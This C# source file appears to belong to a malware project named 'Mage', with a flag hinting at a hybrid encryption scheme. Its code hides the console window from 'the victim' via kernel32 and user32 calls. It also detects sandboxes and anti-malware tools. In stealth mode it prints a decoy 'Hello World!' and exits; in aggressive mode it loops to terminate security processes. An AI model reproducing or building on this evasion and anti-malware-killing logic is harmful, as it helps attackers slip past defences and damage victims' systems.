using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices; //using winapi 
using System.Diagnostics;


namespace Testing
{


    class MageInstance //the final instance for Mage class that uses the utilities in the static classes
    {

        //Console hiding section starts
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr HandlingCode, int CmdCode);
        //console hiding section ends


        //in case of hybrid scheme should be true
        private const bool UsingAsymmetricProtection = true;
        private const bool AggressiveMode = true;
        private const bool ConsoleHiding = true;
        const int WindowHidingCode = ConsoleHiding ? 0 : 5;
        public void MageExecution()
        {


            //hiding window section==>
            if (ConsoleHiding)    //using winapi kernel32 and user32 dlls in order to hide
                                  //app console from the victim
            {
                ShowWindow(GetConsoleWindow(), WindowHidingCode);

            }

            Console.WriteLine("checking for  Anti-malware Programs");
            if (!AggressiveMode)
            {
                if (SandboxEscaper.CheckForSandbox())
                {
                    Console.WriteLine("Hello World!"); //note-in stealth mode, in case of a sandbox/av
                                                       //the program will print hello world and exit!
                    Environment.Exit(0);
                }
            }
            while (SandboxEscaper.CheckForSandbox()) //checking if sandboxes are around. 
                                                     //in aggressive mode the program will loop and try to kill all sandbox/av processes,
            {
                //Terminating Anti-Malware Programs
                Console.WriteLine("Terminating Anti - Malware Programs");
                AntiMalwareTerminator.TerminateAntiMalwarePrograms();

            }
            Console.ReadKey();

        }

    }
}
